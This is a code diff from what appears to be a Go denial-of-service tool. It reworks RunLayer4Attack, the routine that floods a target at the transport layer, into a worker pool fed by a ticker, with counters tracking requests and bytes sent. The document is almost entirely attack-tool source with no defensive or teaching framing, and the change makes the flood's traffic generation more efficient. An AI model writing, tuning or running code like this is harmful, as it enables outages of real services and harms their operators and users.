@@ -25,23 +25,49 @@ type Layer4Config struct {
 	ProtocolID int
 }
 
-// RunLayer4Attack executes a Layer 4 attack
+// RunLayer4Attack executes a Layer 4 attack with efficient worker pool
 func RunLayer4Attack(cfg *Layer4Config, wg *sync.WaitGroup, stopChan chan struct{}, requestsSent, bytesSent *utils.Counter) {
+	// Use buffered channel for work distribution
+	workChan := make(chan struct{}, cfg.Threads*2)
+
+	// Start worker goroutines
 	for i := range cfg.Threads {
 		wg.Add(1)
 		go func(threadID int) {
 			defer wg.Done()
 
+			// Worker loop - more efficient than tight loop
 			for {
 				select {
 				case <-stopChan:
 					return
-				default:
+				case <-workChan:
 					executeLayer4Method(cfg, requestsSent, bytesSent)
 				}
 			}
 		}(i)
 	}
+
+	// Work producer - fills the work channel
+	go func() {
+		ticker := time.NewTicker(1 * time.Millisecond)
+		defer ticker.Stop()
+
+		for {
+			select {
+			case <-stopChan:
+				close(workChan)
+				return
+			case <-ticker.C:
+				// Try to send work without blocking
+				select {
+				case workChan <- struct{}{}:
+				default:
+					// Channel full, workers are busy
+				}
+			}
+		}
+	}()
 }
 
 func executeLayer4Method(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
